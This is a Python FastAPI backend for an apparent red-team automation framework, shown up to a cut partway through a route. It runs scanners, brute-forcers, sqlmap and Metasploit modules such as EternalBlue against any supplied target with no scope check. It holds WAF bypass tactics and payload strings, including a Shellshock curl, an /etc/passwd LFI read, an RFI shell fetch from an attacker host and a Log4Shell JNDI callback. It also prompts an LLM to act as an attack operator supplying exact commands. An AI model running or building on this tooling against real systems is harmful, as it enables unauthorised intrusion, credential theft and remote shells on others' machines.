from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks, WebSocket, WebSocketDisconnect
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, ConfigDict
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import subprocess
import httpx
import json
import re

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

KIMI_API_KEY = os.environ.get('KIMI_API_KEY', '')
KIMI_API_URL = "https://api.moonshot.ai/v1/chat/completions"

app = FastAPI(title="Red Team Automation Framework")
api_router = APIRouter(prefix="/api")

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

scan_progress: Dict[str, Dict[str, Any]] = {}
attack_trees: Dict[str, Dict[str, Any]] = {}
active_connections: Dict[str, List[WebSocket]] = {}

# =============================================================================
# TACTICAL DECISION ENGINE - ADAPTIVE ATTACK PLANNING
# =============================================================================
class TacticalDecisionEngine:
    """
    Motor de decisión táctica que adapta el plan de ataque en tiempo real
    basado en los hallazgos durante la operación.
    """
    
    # WAF Bypass strategies
    WAF_BYPASS_STRATEGIES = {
        "cloudflare": {
            "name": "Cloudflare",
            "techniques": [
                {"id": "T1090", "name": "Origin IP Discovery", "tools": ["censys", "shodan", "securitytrails"], "cmd": "Use historical DNS records, SSL certificates to find origin IP"},
                {"id": "T1027", "name": "Payload Encoding", "tools": ["wafw00f", "sqlmap"], "cmd": "sqlmap --tamper=charencode,space2comment"},
                {"id": "T1071", "name": "Protocol Abuse", "tools": ["curl"], "cmd": "Try HTTP/2, WebSocket connections"},
            ],
            "bypass_headers": ["CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"],
            "alternative_approach": "Find origin IP via email headers, DNS history, or subdomains not behind CF"
        },
        "akamai": {
            "name": "Akamai",
            "techniques": [
                {"id": "T1090", "name": "Edge Bypass", "tools": ["subfinder", "amass"], "cmd": "Find non-Akamai subdomains"},
                {"id": "T1027", "name": "Request Smuggling", "tools": ["smuggler"], "cmd": "HTTP request smuggling attacks"},
            ],
            "alternative_approach": "Look for staging/dev environments not protected by Akamai"
        },
        "aws_waf": {
            "name": "AWS WAF",
            "techniques": [
                {"id": "T1027", "name": "Unicode Normalization", "tools": ["burp"], "cmd": "Use Unicode encoding to bypass rules"},
                {"id": "T1090", "name": "Regional Bypass", "tools": ["vpn"], "cmd": "Try from different AWS regions"},
            ],
            "alternative_approach": "Check for S3 buckets, Lambda endpoints without WAF"
        },
        "imperva": {
            "name": "Imperva/Incapsula",
            "techniques": [
                {"id": "T1090", "name": "Origin Discovery", "tools": ["dig", "nslookup"], "cmd": "Check MX records, SPF for origin"},
                {"id": "T1027", "name": "Payload Fragmentation", "tools": ["sqlmap"], "cmd": "Use chunked encoding"},
            ],
            "alternative_approach": "Historical DNS, Wayback Machine for old IPs"
        },
        "modsecurity": {
            "name": "ModSecurity",
            "techniques": [
                {"id": "T1027", "name": "Rule Bypass", "tools": ["sqlmap"], "cmd": "sqlmap --tamper=between,randomcase"},
                {"id": "T1190", "name": "Anomaly Score Gaming", "tools": ["burp"], "cmd": "Split payload across multiple requests"},
            ],
            "alternative_approach": "Identify paranoia level and craft payloads below threshold"
        },
        "default": {
            "name": "Generic WAF",
            "techniques": [
                {"id": "T1027", "name": "Encoding Bypass", "tools": ["burp", "sqlmap"], "cmd": "Try URL, Unicode, Base64 encoding"},
                {"id": "T1090", "name": "Origin Discovery", "tools": ["censys", "shodan"], "cmd": "Search for exposed origin servers"},
                {"id": "T1071", "name": "Protocol Switch", "tools": ["curl"], "cmd": "Try HTTPS, HTTP/2, gRPC if available"},
            ],
            "alternative_approach": "Enumerate all subdomains, find unprotected endpoints"
        }
    }
    
    # Service-specific attack strategies
    SERVICE_ATTACK_MAP = {
        "ssh": {
            "22/tcp": ["hydra", "crackmapexec"],
            "exploits": ["auxiliary/scanner/ssh/ssh_login", "exploit/linux/ssh/sshexec"],
            "next_phase": "credential_access",
            "decision": "SSH detected - attempt credential brute force or key-based auth"
        },
        "http": {
            "80/tcp": ["nikto", "gobuster", "sqlmap"],
            "443/tcp": ["nikto", "gobuster", "sqlmap", "sslscan"],
            "exploits": ["exploit/multi/http/apache_mod_cgi_bash_env_exec", "auxiliary/scanner/http/dir_scanner"],
            "next_phase": "initial_access",
            "decision": "Web server detected - enumerate directories, check for vulns"
        },
        "smb": {
            "445/tcp": ["crackmapexec", "enum4linux"],
            "139/tcp": ["crackmapexec", "enum4linux"],
            "exploits": ["exploit/windows/smb/ms17_010_eternalblue", "auxiliary/scanner/smb/smb_ms17_010"],
            "next_phase": "initial_access",
            "decision": "SMB detected - check for EternalBlue, null sessions"
        },
        "rdp": {
            "3389/tcp": ["hydra", "ncrack"],
            "exploits": ["auxiliary/scanner/rdp/rdp_scanner", "exploit/windows/rdp/cve_2019_0708_bluekeep_rce"],
            "next_phase": "initial_access",
            "decision": "RDP detected - check BlueKeep, attempt credential attack"
        },
        "mysql": {
            "3306/tcp": ["hydra", "mysql"],
            "exploits": ["auxiliary/scanner/mysql/mysql_login"],
            "next_phase": "credential_access",
            "decision": "MySQL detected - attempt default creds, check for UDF exploitation"
        },
        "mssql": {
            "1433/tcp": ["crackmapexec", "mssqlclient"],
            "exploits": ["auxiliary/scanner/mssql/mssql_login", "exploit/windows/mssql/mssql_payload"],
            "next_phase": "credential_access",
            "decision": "MSSQL detected - xp_cmdshell potential, credential spray"
        },
        "ftp": {
            "21/tcp": ["hydra", "nmap"],
            "exploits": ["auxiliary/scanner/ftp/anonymous", "exploit/unix/ftp/vsftpd_234_backdoor"],
            "next_phase": "initial_access",
            "decision": "FTP detected - check anonymous access, version exploits"
        },
        "ldap": {
            "389/tcp": ["ldapsearch", "windapsearch"],
            "636/tcp": ["ldapsearch"],
            "exploits": ["auxiliary/gather/ldap_query"],
            "next_phase": "discovery",
            "decision": "LDAP detected - enumerate AD, check for null bind"
        },
        "winrm": {
            "5985/tcp": ["evil-winrm", "crackmapexec"],
            "5986/tcp": ["evil-winrm"],
            "exploits": ["auxiliary/scanner/winrm/winrm_login"],
            "next_phase": "lateral_movement",
            "decision": "WinRM detected - potential for lateral movement with creds"
        },
        "kerberos": {
            "88/tcp": ["kerbrute", "impacket"],
            "exploits": ["auxiliary/gather/kerberos_enumusers"],
            "next_phase": "credential_access",
            "decision": "Kerberos detected - AS-REP roasting, Kerberoasting possible"
        }
    }
    
    # Vulnerability to exploit mapping
    VULN_EXPLOIT_MAP = {
        "sql injection": {
            "tools": ["sqlmap"],
            "cmd": "sqlmap -u '{url}' --dbs --batch --random-agent",
            "exploits": [],
            "severity": "critical",
            "next_action": "Dump database, look for credentials"
        },
        "xss": {
            "tools": ["xsser", "dalfox"],
            "cmd": "dalfox url '{url}' --blind your-server.com",
            "exploits": [],
            "severity": "high",
            "next_action": "Attempt session hijacking, phishing"
        },
        "lfi": {
            "tools": ["burp", "curl"],
            "cmd": "curl '{url}?file=../../../etc/passwd'",
            "exploits": ["exploit/unix/webapp/php_include"],
            "severity": "critical",
            "next_action": "Read /etc/passwd, attempt RCE via log poisoning"
        },
        "rfi": {
            "tools": ["curl"],
            "cmd": "curl '{url}?file=http://attacker/shell.php'",
            "exploits": ["exploit/unix/webapp/php_include"],
            "severity": "critical",
            "next_action": "Host malicious PHP, get shell"
        },
        "command injection": {
            "tools": ["commix", "burp"],
            "cmd": "commix -u '{url}' --batch",
            "exploits": [],
            "severity": "critical",
            "next_action": "Get reverse shell immediately"
        },
        "ssrf": {
            "tools": ["burp", "ssrfmap"],
            "cmd": "Try internal IPs: 127.0.0.1, 169.254.169.254 (AWS metadata)",
            "exploits": [],
            "severity": "high",
            "next_action": "Access internal services, cloud metadata"
        },
        "shellshock": {
            "tools": ["curl", "metasploit"],
            "cmd": "curl -A '() { :;}; /bin/bash -c \"id\"' {url}",
            "exploits": ["exploit/multi/http/apache_mod_cgi_bash_env_exec"],
            "severity": "critical",
            "next_action": "Immediate RCE possible"
        },
        "log4shell": {
            "tools": ["log4j-scan", "metasploit"],
            "cmd": "${jndi:ldap://attacker:1389/a}",
            "exploits": ["exploit/multi/http/log4shell_header_injection"],
            "severity": "critical",
            "next_action": "Deploy JNDI callback server, get shell"
        },
        "eternalblue": {
            "tools": ["metasploit"],
            "cmd": "use exploit/windows/smb/ms17_010_eternalblue",
            "exploits": ["exploit/windows/smb/ms17_010_eternalblue"],
            "severity": "critical",
            "next_action": "Direct RCE, SYSTEM shell"
        }
    }
    
    @classmethod
    def analyze_waf_detection(cls, waf_result: Dict) -> Dict[str, Any]:
        """Analyze WAF detection and provide bypass strategies"""
        waf_name = waf_result.get("waf", "").lower() if waf_result.get("waf") else None
        
        if not waf_name or waf_name == "none detected":
            return {
                "waf_detected": False,
                "decision": "No WAF detected - proceed with standard attack methodology",
                "strategy": None,
                "risk_level": "low"
            }
        
        # Find matching WAF strategy
        strategy = None
        for key, strat in cls.WAF_BYPASS_STRATEGIES.items():
            if key in waf_name.lower():
                strategy = strat
                break
        
        if not strategy:
            strategy = cls.WAF_BYPASS_STRATEGIES["default"]
        
        return {
            "waf_detected": True,
            "waf_name": waf_name,
            "decision": f"WAF DETECTED: {waf_name} - Adapting attack strategy",
            "strategy": strategy,
            "bypass_techniques": strategy["techniques"],
            "alternative_approach": strategy["alternative_approach"],
            "risk_level": "high",
            "recommendation": "Consider origin IP discovery before direct attacks"
        }
    
    @classmethod
    def analyze_ports(cls, nmap_result: Dict) -> List[Dict[str, Any]]:
        """Analyze open ports and recommend next actions"""
        decisions = []
        ports = nmap_result.get("ports", [])
        
        for port_info in ports:
            port = port_info.get("port", "")
            service = port_info.get("service", "").lower()
            state = port_info.get("state", "")
            
            if state != "open":
                continue
            
            # Find matching service strategy
            for svc_name, svc_strategy in cls.SERVICE_ATTACK_MAP.items():
                if svc_name in service or port in svc_strategy:
                    decisions.append({
                        "port": port,
                        "service": service,
                        "attack_strategy": svc_strategy,
                        "decision": svc_strategy["decision"],
                        "recommended_tools": svc_strategy.get(port, svc_strategy.get(list(svc_strategy.keys())[0])),
                        "exploits": svc_strategy["exploits"],
                        "next_phase": svc_strategy["next_phase"]
                    })
                    break
        
        return decisions
    
    @classmethod
    def analyze_vulnerabilities(cls, vuln_results: Dict) -> List[Dict[str, Any]]:
        """Analyze found vulnerabilities and recommend exploits"""
        decisions = []
        vulns = vuln_results.get("vulnerabilities", [])
        
        for vuln in vulns:
            vuln_text = vuln.get("finding", str(vuln)).lower() if isinstance(vuln, dict) else str(vuln).lower()
            
            for vuln_type, vuln_strategy in cls.VULN_EXPLOIT_MAP.items():
                if vuln_type in vuln_text:
                    decisions.append({
                        "vulnerability": vuln_type,
                        "finding": vuln_text[:100],
                        "severity": vuln_strategy["severity"],
                        "tools": vuln_strategy["tools"],
                        "command": vuln_strategy["cmd"],
                        "exploits": vuln_strategy["exploits"],
                        "next_action": vuln_strategy["next_action"]
                    })
                    break
        
        return decisions
    
    @classmethod
    async def get_tactical_advice(cls, results: Dict, target: str) -> Dict[str, Any]:
        """Get real-time tactical advice based on scan results"""
        advice = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target": target,
            "waf_analysis": None,
            "port_decisions": [],
            "vuln_decisions": [],
            "kill_chain_update": [],
            "priority_actions": [],
            "overall_strategy": ""
        }
        
        # Analyze WAF
        if "wafw00f" in results or "waf" in results:
            waf_result = results.get("wafw00f", results.get("waf", {}))
            advice["waf_analysis"] = cls.analyze_waf_detection(waf_result)
            
            if advice["waf_analysis"]["waf_detected"]:
                advice["priority_actions"].append({
                    "priority": 1,
                    "action": "WAF Bypass Required",
                    "details": advice["waf_analysis"]["alternative_approach"]
                })
        
        # Analyze ports
        if "nmap" in results:
            advice["port_decisions"] = cls.analyze_ports(results["nmap"])
            
            for decision in advice["port_decisions"]:
                if "smb" in decision["service"] or "rdp" in decision["service"]:
                    advice["priority_actions"].append({
                        "priority": 2,
                        "action": f"High-value target: {decision['service']}",
                        "details": decision["decision"]
                    })
        
        # Analyze vulnerabilities
        if "nikto" in results:
            advice["vuln_decisions"] = cls.analyze_vulnerabilities(results["nikto"])
            
            for vuln in advice["vuln_decisions"]:
                if vuln["severity"] == "critical":
                    advice["priority_actions"].append({
                        "priority": 1,
                        "action": f"Critical: {vuln['vulnerability']}",
                        "details": vuln["next_action"]
                    })
        
        # Sort priority actions
        advice["priority_actions"].sort(key=lambda x: x["priority"])
        
        # Generate overall strategy
        if advice["waf_analysis"] and advice["waf_analysis"]["waf_detected"]:
            advice["overall_strategy"] = f"WAF detected ({advice['waf_analysis']['waf_name']}). Recommend indirect approach: origin IP discovery, subdomain enumeration for unprotected assets."
        elif advice["priority_actions"]:
            advice["overall_strategy"] = f"Direct attack viable. Focus on: {advice['priority_actions'][0]['action']}"
        else:
            advice["overall_strategy"] = "Continue reconnaissance. No immediate high-value targets identified."
        
        return advice


# =============================================================================
# MITRE ATT&CK TACTICS & TECHNIQUES DATABASE
# =============================================================================
MITRE_TACTICS = {
    "reconnaissance": {
        "id": "TA0043", "name": "Reconnaissance", "description": "Gathering information",
        "techniques": [
            {"id": "T1595", "name": "Active Scanning", "tools": ["nmap", "masscan"]},
            {"id": "T1592", "name": "Gather Victim Host Info", "tools": ["whatweb"]},
            {"id": "T1590", "name": "Gather Victim Network Info", "tools": ["subfinder", "amass"]},
        ]
    },
    "resource_development": {
        "id": "TA0042", "name": "Resource Development", "description": "Establishing resources",
        "techniques": [{"id": "T1587", "name": "Develop Capabilities", "tools": ["msfvenom"]}]
    },
    "initial_access": {
        "id": "TA0001", "name": "Initial Access", "description": "Gaining foothold",
        "techniques": [
            {"id": "T1190", "name": "Exploit Public-Facing App", "tools": ["nikto", "sqlmap"]},
            {"id": "T1133", "name": "External Remote Services", "tools": ["hydra"]},
        ]
    },
    "execution": {"id": "TA0002", "name": "Execution", "description": "Running code", "techniques": []},
    "persistence": {"id": "TA0003", "name": "Persistence", "description": "Maintaining access", "techniques": []},
    "privilege_escalation": {"id": "TA0004", "name": "Privilege Escalation", "description": "Higher permissions", "techniques": []},
    "defense_evasion": {"id": "TA0005", "name": "Defense Evasion", "description": "Avoiding detection", "techniques": []},
    "credential_access": {"id": "TA0006", "name": "Credential Access", "description": "Stealing creds", "techniques": []},
    "discovery": {"id": "TA0007", "name": "Discovery", "description": "Understanding environment", "techniques": []},
    "lateral_movement": {"id": "TA0008", "name": "Lateral Movement", "description": "Moving through env", "techniques": []},
    "collection": {"id": "TA0009", "name": "Collection", "description": "Gathering data", "techniques": []},
    "command_and_control": {"id": "TA0011", "name": "Command and Control", "description": "C2 comms", "techniques": []},
    "exfiltration": {"id": "TA0010", "name": "Exfiltration", "description": "Stealing data", "techniques": []},
    "impact": {"id": "TA0040", "name": "Impact", "description": "Disrupt/destroy", "techniques": []},
}

# =============================================================================
# RED TEAM TOOLS DATABASE
# =============================================================================
RED_TEAM_TOOLS = {
    "nmap": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "nmap -sV -sC -A {target}", "desc": "Port scanner"},
    "masscan": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "masscan -p1-65535 {target} --rate=1000", "desc": "Fast scanner"},
    "subfinder": {"phase": "reconnaissance", "mitre": "T1590", "cmd": "subfinder -d {target}", "desc": "Subdomain finder"},
    "wafw00f": {"phase": "reconnaissance", "mitre": "T1592", "cmd": "wafw00f {target}", "desc": "WAF detector"},
    "whatweb": {"phase": "reconnaissance", "mitre": "T1592", "cmd": "whatweb {target}", "desc": "Web fingerprint"},
    "gobuster": {"phase": "reconnaissance", "mitre": "T1594", "cmd": "gobuster dir -u {target} -w wordlist.txt", "desc": "Dir bruteforce"},
    "nikto": {"phase": "initial_access", "mitre": "T1190", "cmd": "nikto -h {target}", "desc": "Web vuln scanner"},
    "sqlmap": {"phase": "initial_access", "mitre": "T1190", "cmd": "sqlmap -u '{target}' --batch", "desc": "SQL injection"},
    "hydra": {"phase": "initial_access", "mitre": "T1110", "cmd": "hydra -L users.txt -P pass.txt {target} ssh", "desc": "Brute force"},
    "crackmapexec": {"phase": "initial_access", "mitre": "T1078", "cmd": "crackmapexec smb {target}", "desc": "SMB/AD pentesting"},
}

# =============================================================================
# METASPLOIT MODULES
# =============================================================================
METASPLOIT_MODULES = [
    {"name": "exploit/multi/http/apache_mod_cgi_bash_env_exec", "desc": "Shellshock", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    {"name": "exploit/multi/http/log4shell_header_injection", "desc": "Log4Shell", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
    {"name": "exploit/windows/smb/ms17_010_eternalblue", "desc": "EternalBlue", "rank": "excellent", "category": "exploit", "mitre": "T1210"},
    {"name": "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec", "desc": "PwnKit", "rank": "excellent", "category": "exploit", "mitre": "T1068"},
    {"name": "exploit/linux/local/cve_2022_0847_dirtypipe", "desc": "Dirty Pipe", "rank": "excellent", "category": "exploit", "mitre": "T1068"},
    {"name": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce", "desc": "BlueKeep", "rank": "manual", "category": "exploit", "mitre": "T1210"},
    {"name": "auxiliary/scanner/smb/smb_ms17_010", "desc": "EternalBlue Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1595"},
    {"name": "auxiliary/scanner/ssh/ssh_login", "desc": "SSH Brute Force", "rank": "normal", "category": "auxiliary", "mitre": "T1110"},
    {"name": "auxiliary/scanner/http/dir_scanner", "desc": "Dir Scanner", "rank": "normal", "category": "auxiliary", "mitre": "T1594"},
    {"name": "post/windows/gather/hashdump", "desc": "Hash Dump", "rank": "normal", "category": "post", "mitre": "T1003"},
    {"name": "post/multi/recon/local_exploit_suggester", "desc": "Exploit Suggester", "rank": "normal", "category": "post", "mitre": "T1068"},
]

# =============================================================================
# MODELS
# =============================================================================
class ScanCreate(BaseModel):
    target: str
    scan_phases: List[str] = ["reconnaissance", "initial_access"]
    tools: List[str] = []

class ExploitExecute(BaseModel):
    scan_id: str
    node_id: str
    module: str
    target_host: str
    target_port: Optional[int] = None
    options: Dict[str, str] = {}
    lhost: Optional[str] = None
    lport: Optional[int] = 4444

class UpdateNodeStatus(BaseModel):
    status: str
    notes: Optional[str] = None

# =============================================================================
# HELPER FUNCTIONS
# =============================================================================
def parse_nmap_output(output: str) -> Dict[str, Any]:
    ports = []
    for line in output.split('\n'):
        if '/tcp' in line or '/udp' in line:
            parts = line.split()
            if len(parts) >= 3:
                ports.append({"port": parts[0], "state": parts[1], "service": parts[2]})
    return {"ports": ports, "raw": output}

def parse_waf_output(output: str) -> Dict[str, Any]:
    waf = None
    if "is behind" in output.lower():
        match = re.search(r'is behind (.+?)(?:\n|$)', output, re.IGNORECASE)
        if match:
            waf = match.group(1).strip()
    elif "no waf" in output.lower():
        waf = "None Detected"
    return {"waf": waf, "raw": output}

def parse_nikto_output(output: str) -> Dict[str, Any]:
    vulns = []
    for line in output.split('\n'):
        if line.strip().startswith('+'):
            severity = "medium"
            if any(x in line.lower() for x in ['critical', 'rce', 'injection']):
                severity = "critical"
            elif any(x in line.lower() for x in ['xss', 'sql']):
                severity = "high"
            vulns.append({"finding": line.strip(), "severity": severity})
    return {"vulnerabilities": vulns, "raw": output}

async def run_tool(tool_id: str, target: str) -> Dict[str, Any]:
    tool = RED_TEAM_TOOLS.get(tool_id)
    if not tool:
        return {"error": f"Unknown tool: {tool_id}"}
    
    try:
        cmd = tool["cmd"].format(target=target)
        result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=300)
        output = result.stdout + result.stderr
        
        if tool_id == "nmap":
            return parse_nmap_output(output)
        elif tool_id == "wafw00f":
            return parse_waf_output(output)
        elif tool_id == "nikto":
            return parse_nikto_output(output)
        return {"output": output}
    except FileNotFoundError:
        return {"simulated": True, "tool": tool_id, "phase": tool["phase"], "command": tool["cmd"].format(target=target)}
    except Exception as e:
        return {"error": str(e)}

async def run_metasploit(module: str, target: str, port: Optional[int], options: Dict, lhost: str = None, lport: int = 4444) -> Dict[str, Any]:
    rc_content = f"use {module}\nset RHOSTS {target}\n"
    if port:
        rc_content += f"set RPORT {port}\n"
    if lhost:
        rc_content += f"set LHOST {lhost}\n"
    if lport:
        rc_content += f"set LPORT {lport}\n"
    rc_content += "run\nexit\n"
    
    try:
        rc_file = f"/tmp/msf_{uuid.uuid4().hex[:8]}.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        result = subprocess.run(["msfconsole", "-q", "-r", rc_file], capture_output=True, text=True, timeout=300)
        os.remove(rc_file)
        output = result.stdout + result.stderr
        success = "session" in output.lower() and "opened" in output.lower()
        return {"module": module, "success": success, "session_opened": success, "output": output, "rc_command": rc_content}
    except FileNotFoundError:
        return {"module": module, "simulated": True, "success": False, "rc_command": rc_content}
    except Exception as e:
        return {"error": str(e)}

async def get_tactical_ai_advice(results: Dict, target: str, tactical_analysis: Dict) -> Dict[str, Any]:
    """Get AI advice with tactical context"""
    if not KIMI_API_KEY:
        return {"analysis": "API key not configured", "exploits": []}
    
    prompt = f"""Eres un Red Team Operator experto. Analiza estos resultados y el análisis táctico para {target}:

RESULTADOS DEL ESCANEO:
{json.dumps(results, indent=2, default=str)[:3000]}

ANÁLISIS TÁCTICO AUTOMÁTICO:
{json.dumps(tactical_analysis, indent=2, default=str)}

Basándote en el análisis táctico, proporciona:

1. **VALIDACIÓN DEL ANÁLISIS TÁCTICO**: ¿El motor de decisión identificó correctamente los vectores?

2. **AJUSTES AL PLAN**: Si se detectó WAF, ¿qué técnicas adicionales de bypass recomiendas?

3. **SECUENCIA DE ATAQUE ÓPTIMA**: Ordena las acciones por probabilidad de éxito

4. **COMANDOS ESPECÍFICOS**: Para cada vector identificado, dame el comando exacto

5. **CONTINGENCIAS**: Si el plan principal falla, ¿cuál es el plan B?

Responde en español, sé conciso y táctico."""

    try:
        async with httpx.AsyncClient(timeout=90.0) as http:
            response = await http.post(
                KIMI_API_URL,
                headers={"Authorization": f"Bearer {KIMI_API_KEY}", "Content-Type": "application/json"},
                json={"model": "kimi-k2-0711-preview", "messages": [
                    {"role": "system", "content": "Eres un Red Team operator. Sé táctico y directo."},
                    {"role": "user", "content": prompt}
                ], "temperature": 0.3, "max_tokens": 4000}
            )
            if response.status_code == 200:
                data = response.json()
                ai_response = data["choices"][0]["message"]["content"]
                exploits = []
                for line in ai_response.split('\n'):
                    if 'use ' in line.lower() and ('exploit/' in line or 'auxiliary/' in line):
                        match = re.search(r'use\s+((?:exploit|auxiliary|post)/[^\s]+)', line, re.IGNORECASE)
                        if match:
                            exploits.append({"type": "metasploit", "module": match.group(1)})
                return {"analysis": ai_response, "exploits": exploits}
            return {"analysis": f"API Error: {response.status_code}", "exploits": []}
    except Exception as e:
        return {"analysis": f"Error: {str(e)}", "exploits": []}

def build_attack_tree(scan_id: str, target: str, results: Dict, phases: List[str], ai_data: Dict, tactical: Dict) -> Dict[str, Any]:
    tree = {
        "scan_id": scan_id,
        "root": {"id": "root", "type": "target", "name": target, "description": f"Target: {target}", "status": "testing", "children": []},
        "nodes": {},
        "tactical_decisions": tactical
    }
    
    node_id = 0
    
    # Add tactical decisions as priority nodes
    if tactical.get("waf_analysis", {}).get("waf_detected"):
        node_id += 1
        waf_node_id = f"waf_{node_id}"
        tree["nodes"][waf_node_id] = {
            "id": waf_node_id, "parent_id": "root", "type": "defense",
            "name": f"⚠️ WAF: {tactical['waf_analysis']['waf_name']}",
            "description": tactical['waf_analysis']['alternative_approach'],
            "status": "pending", "severity": "high",
            "data": {"bypass_techniques": tactical['waf_analysis']['bypass_techniques']},
            "children": []
        }
        tree["root"]["children"].append(waf_node_id)
        
        # Add bypass techniques
        for tech in tactical['waf_analysis']['bypass_techniques']:
            node_id += 1
            tech_id = f"bypass_{node_id}"
            tree["nodes"][tech_id] = {
                "id": tech_id, "parent_id": waf_node_id, "type": "technique",
                "name": f"{tech['id']} - {tech['name']}", "description": tech['cmd'],
                "status": "pending", "severity": "medium", "mitre": tech['id'],
                "data": {"tools": tech['tools']}, "children": []
            }
            tree["nodes"][waf_node_id]["children"].append(tech_id)
    
    # Add priority actions
    for action in tactical.get("priority_actions", []):
        node_id += 1
        action_id = f"priority_{node_id}"
        tree["nodes"][action_id] = {
            "id": action_id, "parent_id": "root", "type": "priority",
            "name": f"🎯 P{action['priority']}: {action['action']}",
            "description": action['details'],
            "status": "pending", "severity": "critical" if action['priority'] == 1 else "high",
            "data": action, "children": []
        }
        tree["root"]["children"].append(action_id)
    
    # Add tool results
    for tool_id, result in results.items():
        tool_info = RED_TEAM_TOOLS.get(tool_id, {})
        node_id += 1
        tool_node_id = f"tool_{node_id}"
        tree["nodes"][tool_node_id] = {
            "id": tool_node_id, "parent_id": "root", "type": "tool",
            "name": f"{tool_id.upper()}", "description": tool_info.get('desc', ''),
            "status": "completed" if not result.get("error") else "failed",
            "severity": "info", "mitre": tool_info.get('mitre'),
            "data": result, "children": []
        }
        tree["root"]["children"].append(tool_node_id)
    
    # Add AI exploits
    for exploit in ai_data.get("exploits", []):
        node_id += 1
        exp_id = f"exploit_{node_id}"
        tree["nodes"][exp_id] = {
            "id": exp_id, "parent_id": "root", "type": "exploit",
            "name": exploit.get("module", "Exploit"), "description": "",
            "status": "pending", "severity": "critical",
            "data": exploit, "children": []
        }
        tree["root"]["children"].append(exp_id)
    
    return tree

async def run_scan_background(scan_id: str, target: str, phases: List[str], tools: List[str]):
    global scan_progress, attack_trees
    
    scan_progress[scan_id] = {
        "status": "running", "current_tool": None, "progress": 0,
        "results": {}, "tactical_decisions": [], "ai_analysis": None
    }
    
    tools_to_run = tools or [t for t, info in RED_TEAM_TOOLS.items() if info["phase"] in phases]
    total_steps = len(tools_to_run) + 2  # +2 for tactical + AI
    completed = 0
    
    try:
        for tool_id in tools_to_run:
            scan_progress[scan_id]["current_tool"] = tool_id
            scan_progress[scan_id]["progress"] = int((completed / total_steps) * 100)
            
            result = await run_tool(tool_id, target)
            scan_progress[scan_id]["results"][tool_id] = result
            completed += 1
            
            # TACTICAL DECISION after each tool
            tactical = await TacticalDecisionEngine.get_tactical_advice(scan_progress[scan_id]["results"], target)
            scan_progress[scan_id]["tactical_decisions"].append({
                "after_tool": tool_id,
                "advice": tactical
            })
            
            # Broadcast tactical update (for real-time UI)
            logger.info(f"[TACTICAL] After {tool_id}: {tactical.get('overall_strategy', '')}")
        
        # Final tactical analysis
        scan_progress[scan_id]["current_tool"] = "tactical_engine"
        final_tactical = await TacticalDecisionEngine.get_tactical_advice(scan_progress[scan_id]["results"], target)
        scan_progress[scan_id]["final_tactical"] = final_tactical
        completed += 1
        
        # AI Analysis with tactical context
        scan_progress[scan_id]["current_tool"] = "kimi_ai"
        scan_progress[scan_id]["progress"] = int((completed / total_steps) * 100)
        
        ai_result = await get_tactical_ai_advice(scan_progress[scan_id]["results"], target, final_tactical)
        scan_progress[scan_id]["ai_analysis"] = ai_result["analysis"]
        scan_progress[scan_id]["exploits"] = ai_result.get("exploits", [])
        
        # Build attack tree with tactical info
        attack_tree = build_attack_tree(scan_id, target, scan_progress[scan_id]["results"], phases, ai_result, final_tactical)
        scan_progress[scan_id]["attack_tree"] = attack_tree
        attack_trees[scan_id] = attack_tree
        
        scan_progress[scan_id]["status"] = "completed"
        scan_progress[scan_id]["progress"] = 100
        
        await db.scans.insert_one({
            "id": scan_id, "target": target, "status": "completed",
            "phases": phases, "results": scan_progress[scan_id]["results"],
            "tactical_decisions": scan_progress[scan_id]["tactical_decisions"],
            "final_tactical": final_tactical,
            "ai_analysis": scan_progress[scan_id]["ai_analysis"],
            "attack_tree": attack_tree,
            "created_at": datetime.now(timezone.utc).isoformat()
        })
        
    except Exception as e:
        logger.error(f"Scan error: {str(e)}")
        scan_progress[scan_id]["status"] = "error"
        scan_progress[scan_id]["error"] = str(e)

# =============================================================================
# API ROUTES
# =============================================================================
@api_router.get("/")
async def root():
    return {"message": "Red Team Automation Framework", "version": "3.1.0", "features": ["tactical_engine", "adaptive_planning", "waf_bypass"]}

@api_router.get("/mitre/tactics")
async def get_mitre_tactics():
    return {"tactics": MITRE_TACTICS}

@api_router.get("/tools")
async def get_tools(phase: str = None):
    tools = {k: v for k, v in RED_TEAM_TOOLS.items() if not phase or v["phase"] == phase}
    return {"tools": tools}

@api_router.get("/tactical/waf-bypass/{waf_name}")
async def get_waf_bypass_strategy(waf_name: str):
    """Get specific WAF bypass strategies"""
    waf_lower = waf_name.lower()
    for key, strategy in TacticalDecisionEngine.WAF_BYPASS_STRATEGIES.items():
        if key in waf_lower:
            return strategy
    return TacticalDecisionEngine.WAF_BYPASS_STRATEGIES["default"]

@api_router.get("/tactical/service-attacks")
async def get_service_attacks():
    """Get service-specific attack strategies"""
    return {"strategies": TacticalDecisionEngine.SERVICE_ATTACK_MAP}

@api_router.get("/tactical/vuln-exploits")
async def get_vuln_exploits():
    """Get vulnerability to exploit mapping"""
    return {"mappings": TacticalDecisionEngine.VULN_EXPLOIT_MAP}

@api_router.post("/scan/start")
async def start_scan(scan: ScanCreate, background_tasks: BackgroundTasks):
    scan_id = str(uuid.uuid4())
    target = scan.target.strip().replace("https://", "").replace("http://", "").split("/")[0]
    background_tasks.add_task(run_scan_background, scan_id, target, scan.scan_phases, scan.tools)
    return {"scan_id": scan_id, "target": target, "phases": scan.scan_phases, "status": "started"}

@api_router.get("/scan/{scan_id}/status")
async def get_scan_status(scan_id: str):
    if scan_id in scan_progress:
        p = scan_progress[scan_id]
        return {
